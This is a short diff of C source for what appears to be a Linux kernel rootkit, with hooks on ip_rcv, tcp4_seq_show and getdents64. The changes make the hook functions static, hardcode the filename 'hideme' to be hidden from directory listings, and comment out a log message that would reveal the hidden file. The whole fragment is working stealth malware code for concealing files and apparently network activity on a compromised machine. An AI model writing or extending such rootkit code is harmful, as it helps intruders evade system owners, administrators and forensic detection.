@@ -2,7 +2,10 @@
 
 #include "hooks.h"
 
-asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
+
+
+
+static asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
  	   struct net_device *orig_dev){
 
 	struct iphdr *ip_header = (struct iphdr *)skb_network_header(skb);
@@ -53,7 +56,7 @@ static asmlinkage int new_tcp4_seq_show(struct seq_file *seq, void *v)
 }
 
 
-asmlinkage int new_getdents64(const struct pt_regs *regs)
+static asmlinkage int new_getdents64(const struct pt_regs *regs)
 {
 	struct linux_dirent64 *dirent_kern, *dirent, *curr_ent, *prev_ent = NULL; 
 	unsigned int len;
@@ -81,8 +84,8 @@ asmlinkage int new_getdents64(const struct pt_regs *regs)
 		prev_ent = curr_ent;
 		curr_ent = (void*)dirent_kern + index;
 		
-		if (strcmp(file_to_hide, curr_ent->d_name) == 0){
-			printk(KERN_INFO "found secret file: %s",file_to_hide);
+		if (strcmp("hideme", curr_ent->d_name) == 0){
+			//printk(KERN_INFO "found secret file: %s",file_to_hide);
 			if (index == 0 )// special case
 			{
 				len -= curr_ent->d_reclen;
